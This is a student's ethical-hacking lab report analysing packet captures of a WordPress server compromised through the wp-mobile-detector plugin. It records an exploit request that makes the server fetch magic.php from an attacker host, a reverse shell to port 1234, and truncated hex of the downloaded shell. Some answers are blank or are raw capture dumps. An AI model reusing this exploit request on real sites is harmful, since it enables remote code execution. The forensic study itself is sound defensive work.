# Ethical Hacking Technologies
## Lab Work 2: Attack Analysis

**Student: [Your Name]**

### Aim of the LAB 2

### Working Tools:
- Network traffic image; pcap file.
- Wireshark, tcpdump - network traffic analysis software.

### Methodology for Carrying Out the Lab
**Subject of the Study:** Analysis of a compromised website to identify the attack vector.

**Tasks and Analysis:**
1. **What is the IP address of the site's service?**

   | IP address of the service |
   |--------------------------|
   | 10.2.0.7                 |

2. **Which website hosting service (daemon) and which version of the service is running on the server?**

   | IP address of the server | WEB (HTTP) service      | WEB (HTTP) service version |
   |--------------------------|------------------------|----------------------------|
   | 10.2.0.7                 | Apache/2.4.29 (Win32)   | 2.4.29                     |

3. **Can you determine which operating system is used on the website service?**

   | Server Operating System |
   |-------------------------|
   | Windows (because of TTL 128) |

4. **Can you identify which content management system is used?**

   | CMS and Evidence |
   |------------------|
   | The CMS is WordPress. The URL /web/wp-content/plugins/wp-mobile-detector/resize.php?src=http://10.2.0.4/magic.php indicates a request made to the "wp-mobile-detector" plugin which is developed for WordPress. The path wp-content/plugins is the standard directory where plugins are stored in WordPress sites. This is a strong indication that the WordPress CMS is being used on the site. |

5. **Can you determine which port was used to connect remotely to the server?**

   | IP address where the connection came from | IP address where the connection is made | Port | Service                                       |
   |------------------------------------------|----------------------------------------|------|----------------------------------------------|
   | 10.2.0.7                                 | 83.171.9.248                           | 3389 | Remote Desktop Protocol (RDP) over TCP      |

6. **What is the IP address and port of the reserve shell?**

   | Reverse shell IP address | Reverse shell port |
   |--------------------------|--------------------|
   | 10.2.0.4                 | 1234               |

7. **What does the application do (run)?**

   | Type (malicious) | Action performed by the malware                                                                 | Actions taken by the malware                                                                 |
   |------------------|-------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------|
   | Magic.php        | Establishes a reverse shell connection to the attacker's machine. Executes commands received from the attacker on the compromised server. | Bypasses execution time limits for persistent operation. Attempts to daemonize itself to avoid detection and maintain a background process. Opens a network connection to a specific IP and port controlled by the attacker. Allows the attacker to execute arbitrary commands on the compromised server potentially leading to further exploitation, data theft, or system damage. |

8. **Which message is encoded in the *.php file?**

   | File name    | Message text                                                                                                                               |
   |--------------|-------------------------------------------------------------------------------------------------------------------------------------------|
   | Hacked.php   | Frame 4386: 441 bytes on wire (3528 bits) 441 bytes captured (3528 bits) Ethernet II Src: fa:16:3e:29:17:b5 (fa:16:3e:29:17:b5) Dst: fa:16:3e:f6:26:8a (fa:16:3e:f6:26:8a) Internet Protocol Version 4 Src: 10.2.0.4 Dst: 10.2.0.7 Transmission Control Protocol Src Port: 80 Dst Port: 49348 Seq: 4081 Ack: 63 Len: 387 [4 Reassembled TCP Segments (4467 bytes): #4383(1360) #4384(1360) #4385(1360) #4386(387)] Hypertext Transfer Protocol HTTP/1.1 200 OK\r\n Date: Wed 13 Feb 2019 06:29:54 GMT\r\n Server: Apache/2.4.18 (Ubuntu)\r\n Content-Description: File Transfer\r\n Content-Disposition: attachment; filename=hacked.php\r\n Expires: 0\r\n Cache-Control: must-revalidate\r\n Pragma: public\r\n Content-Length: 4148\r\n Connection: close\r\n Content-Type: application/octet-stream\r\n \r\n [HTTP response 1/1] [Time since request: 0.002024000 seconds] [Request in frame: 4381] [Request URI: http://10.2.0.4/magic.php] File Data: 4148 bytes Data (4148 bytes) Data [truncated]: 3c3f7068700a2f2f202d2d2d2d2d0a2f2f2053656520687474703a2f2f70656e746573746d6f6e6b65792e6e65742f746f6f6c732f7068702d726576657273652d7368656c6c20696620796f752067657420737475636b2e0a0a7365745f74696d655f6c696d6974202830293b0a2 [Length: 4148] |

9. **What is the resulting value when message is decoded?**

   | Meaning encoded | Meaning decoded |
   |-----------------|-----------------|
   |                 |                 |

10. **Attacker information (can you identify the start of the attack?):**

    | MAC (network address)   | Data                                                                                                                                                       | Time                 |
    |-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------|
    | fa:16:3e:29:17:b5       | 3c3f7068700a2f2f202d2d2d2d2d0a2f2f2053656520687474703a2f2f70656e746573746d6f6e6b65792e6e65742f746f6f6c732f7068702d726576657273652d7368656c6c20696620796f752067657420737475636b2e0a0a7365745f74696d655f6c696d6974202830293b0a2 | Wed 13 Feb 2019 06:29:54 |

